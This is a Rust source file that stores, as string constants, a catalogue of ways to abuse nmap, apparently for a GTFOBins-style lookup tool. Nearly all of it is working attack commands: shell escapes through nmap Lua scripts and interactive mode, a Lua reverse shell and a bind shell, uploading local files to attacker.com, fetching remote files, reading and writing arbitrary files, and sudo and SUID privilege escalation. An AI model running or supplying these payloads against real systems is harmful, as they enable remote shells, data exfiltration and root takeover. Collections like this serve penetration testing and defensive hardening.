pub static BIN_NAME: &'static str = "nmap";
pub static SH_DESC_1: &'static str = "Input echo is disabled.";
pub static SH_CODE_1: &'static str = r#"
    
    TF=$(mktemp)
    echo 'os.execute("/bin/sh")' > $TF
    nmap --script=$TF
"#;
pub static SH_DESC_2: &'static str = "The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.";
pub static SH_CODE_2: &'static str = r#"
    
    nmap --interactive
    nmap> !sh
"#;
pub static NIRS_DESC: &'static str =
    "Run `nc -l -p 12345` on the attacker box to receive the shell.";
pub static NIRS_CODE: &'static str = r#"
    
    export RHOST=attacker.com
    export RPORT=12345
    TF=$(mktemp)
    echo 'local s=require("socket");
    local t=assert(s.tcp());
    t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
    while true do
      local r,x=t:receive();local f=assert(io.popen(r,"r"));
      local b=assert(f:read("*a"));t:send(b);
    end;
    f:close();t:close();' > $TF
    nmap --script=$TF
"#;
pub static NIBS_DESC: &'static str =
    "Run `nc target.com 12345` on the attacker box to connect to the shell.";
pub static NIBS_CODE: &'static str = r#"
    
    export LPORT=12345
    TF=$(mktemp)
    echo 'local k=require("socket");
    local s=assert(k.bind("*",os.getenv("LPORT")));
    local c=s:accept();
    while true do
      local r,x=c:receive();local f=assert(io.popen(r,"r"));
      local b=assert(f:read("*a"));c:send(b);
    end;c:close();f:close();' > $TF
    nmap --script=$TF
"#;
pub static FU_DESC_1: &'static str = "Send a local file via TCP. Run `socat -v tcp-listen:8080,reuseaddr,fork - on the attacker box to collect the file or use a proper HTTP server. Note that multiple connections are made to the server. Also, it is important that the port is a commonly used HTTP like 80 or 8080.";
pub static FU_CODE_1: &'static str = r#"
    
    RHOST=attacker.com
    RPORT=8080
    LFILE=file_to_send
    nmap -p $RPORT $RHOST --script http-put --script-args http-put.url=/,http-put.file=$LFILE
"#;
pub static FU_DESC_2: &'static str = "Send a local file via TCP. Run `nc -l -p 12345 > 'file_to_save'` on the attacker box to collect the file.";
pub static FU_CODE_2: &'static str = r#"
    
    export RHOST=attacker.com
    export RPORT=12345
    export LFILE=file_to_send
    TF=$(mktemp)
    echo 'local f=io.open(os.getenv("LFILE"), 'rb')
    local d=f:read("*a")
    io.close(f);
    local s=require("socket");
    local t=assert(s.tcp());
    t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
    t:send(d);
    t:close();' > $TF
    nmap --script=$TF
"#;
pub static FD_DESC_1: &'static str = "Fetch a remote file via TCP. Run a proper HTTP server on the attacker box to send the file, e.g., `php -S 0.0.0.0:8080`. Note that multiple connections are made to the server and the result is placed in `$TF/IP/PORT/PATH`. Also, it is important that the port is a commonly used HTTP like 80 or 8080.";
pub static FD_CODE_1: &'static str = r#"
    
    RHOST=attacker.com
    RPORT=8080
    TF=$(mktemp -d)
    LFILE=file_to_save
    nmap -p $RPORT $RHOST --script http-fetch --script-args http-fetch.destination=$TF,http-fetch.url=$LFILE
"#;
pub static FD_DESC_2: &'static str = "Fetch a remote file via TCP. Run `nc target.com 12345 < 'file_to_send'` on the attacker box to send the file.";
pub static FD_CODE_2: &'static str = r#"
    
    export LPORT=12345
    export LFILE=file_to_save
    TF=$(mktemp)
    echo 'local k=require("socket");
    local s=assert(k.bind("*",os.getenv("LPORT")));
    local c=s:accept();
    local d,x=c:receive("*a");
    c:close();
    local f=io.open(os.getenv("LFILE"), "wb");
    f:write(d);
    io.close(f);' > $TF
    nmap --script=$TF
"#;
pub static FW_CODE_1: &'static str = r#"
    
    TF=$(mktemp)
    echo 'local f=io.open("file_to_write", "wb"); f:write("data"); io.close(f);' > $TF
    nmap --script=$TF
"#;
pub static FW_DESC_2: &'static str = "The payload appears insided the regular nmap output.";
pub static FW_CODE_2: &'static str = r#"
    
    LFILE=file_to_write
    nmap -oG=$LFILE DATA
"#;
pub static FR_CODE: &'static str = r#"
    
    TF=$(mktemp)
    echo 'local f=io.open("file_to_read", "rb"); print(f:read("*a")); io.close(f);' > $TF
    nmap --script=$TF
"#;
pub static SUID_DESC: &'static str = "The payload appears inside the regular nmap output.";
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which nmap) .

    LFILE=file_to_write
    ./nmap -oG=$LFILE DATA
"#;
pub static SUDO_DESC_1: &'static str = "Input echo is disabled.";
pub static SUDO_CODE_1: &'static str = r#"
    
    TF=$(mktemp)
    echo 'os.execute("/bin/sh")' > $TF
    sudo nmap --script=$TF
"#;
pub static SUDO_DESC_2: &'static str = "The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.";
pub static SUDO_CODE_2: &'static str = r#"
    
    sudo nmap --interactive
    nmap> !sh
"#;
pub static LSUID_DESC: &'static str = "Input echo is disabled.";
pub static LSUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which nmap) .

    TF=$(mktemp)
    echo 'os.execute("/bin/sh")' > $TF
    ./nmap --script=$TF
"#;
use crate::code::{Code, Tag};
pub static SH_1: Code<'static> = Code {
    title: "SH_CODE_1",
    code: SH_CODE_1,
    tag: Tag::SH,
};
pub static SH_2: Code<'static> = Code {
    title: "SH_CODE_2",
    code: SH_CODE_2,
    tag: Tag::SH,
};
pub static NIRS: Code<'static> = Code {
    title: "NIRS_CODE",
    code: NIRS_CODE,
    tag: Tag::NIRS,
};
pub static NIBS: Code<'static> = Code {
    title: "NIBS_CODE",
    code: NIBS_CODE,
    tag: Tag::NIBS,
};
pub static FU_1: Code<'static> = Code {
    title: "FU_CODE_1",
    code: FU_CODE_1,
    tag: Tag::FU,
};
pub static FU_2: Code<'static> = Code {
    title: "FU_CODE_2",
    code: FU_CODE_2,
    tag: Tag::FU,
};
pub static FD_1: Code<'static> = Code {
    title: "FD_CODE_1",
    code: FD_CODE_1,
    tag: Tag::FD,
};
pub static FD_2: Code<'static> = Code {
    title: "FD_CODE_2",
    code: FD_CODE_2,
    tag: Tag::FD,
};
pub static FW_1: Code<'static> = Code {
    title: "FW_CODE_1",
    code: FW_CODE_1,
    tag: Tag::FW,
};
pub static FW_2: Code<'static> = Code {
    title: "FW_CODE_2",
    code: FW_CODE_2,
    tag: Tag::FW,
};
pub static FR: Code<'static> = Code {
    title: "FR_CODE",
    code: FR_CODE,
    tag: Tag::FR,
};
pub static SUID: Code<'static> = Code {
    title: "SUID_CODE",
    code: SUID_CODE,
    tag: Tag::SUID,
};
pub static SUDO_1: Code<'static> = Code {
    title: "SUDO_CODE_1",
    code: SUDO_CODE_1,
    tag: Tag::SUDO,
};
pub static SUDO_2: Code<'static> = Code {
    title: "SUDO_CODE_2",
    code: SUDO_CODE_2,
    tag: Tag::SUDO,
};
pub static LSUID: Code<'static> = Code {
    title: "LSUID_CODE",
    code: LSUID_CODE,
    tag: Tag::LSUID,
};
